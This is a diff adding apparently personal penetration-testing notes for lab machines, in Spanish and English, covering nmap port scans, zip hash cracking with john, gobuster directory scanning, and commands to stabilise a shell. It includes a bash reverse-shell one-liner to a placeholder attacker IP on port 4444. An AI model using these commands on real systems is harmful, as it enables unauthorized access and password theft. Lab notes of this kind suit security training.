@@ -1,0 +1,37 @@
+****************************************************************Escaneo de puertos**
+
+ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.46 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+nmap -sC -sV -p$ports 10.10.10.46
+
+***************************************************************Cracking password**
+
+1. Extract hash zip
+  zip2john filezip
+2. Crack the hash
+  john --pot=test.pot --wordlist=/usr/share/john/password.lst hash
+  
+
+************************************************************* comandos para después de obtener una shell**
+Permiten que se pueda interactuar con la shell para poder usar las teclas subir bajar y digitar bien en editores de texto.
+
+Sst raw -echo
+Fg to foreground
+
+Comando para obtener una shell de linux cuando se tiene una conexión con nc.
+
+SHELL=/bin/bash script -q /dev/null
+ó
+bash -c 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1'
+
+************************************************************* Scan web*********************************
+
+Scan subdirectory
+
+gobuster dir -u http://10.10.10.29/ -w /usr/share/wordlists/dirb/common.txt
+
+************************************************************Arquitectura de sistesmas operativos***************************
+
+Windows wmic OS get OSArchitecture
+windows systeminfo | findstr /I type
+Linux uname -r
+
